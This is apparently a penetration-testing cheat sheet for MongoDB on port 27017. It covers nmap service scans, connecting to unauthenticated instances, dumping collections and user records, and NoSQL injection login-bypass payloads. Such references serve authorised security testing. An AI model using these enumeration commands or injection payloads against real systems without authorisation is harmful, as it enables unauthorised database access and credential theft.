# MongoDB (Port 27017)

NoSQL database. Often has no authentication enabled by default.

## Nmap

```bash
nmap -sV -sC -p 27017 <target ip>
nmap --script mongodb-info,mongodb-databases -p 27017 <target ip>
```

## Enumeration

```bash
# connect (no auth)
mongosh --host <target ip>

# or older client
mongo --host <target ip>

# list databases
show dbs

# use a database
use <database>

# list collections (tables)
show collections

# dump a collection
db.<collection>.find()

# look for users/passwords
db.users.find()
db.admin.find()
```

## NoSQL Injection

If there's a web app with MongoDB backend, test for NoSQL injection:

```bash
# in login forms, try
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$gt]=
username=admin&password[$regex]=.*

# JSON body
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
```
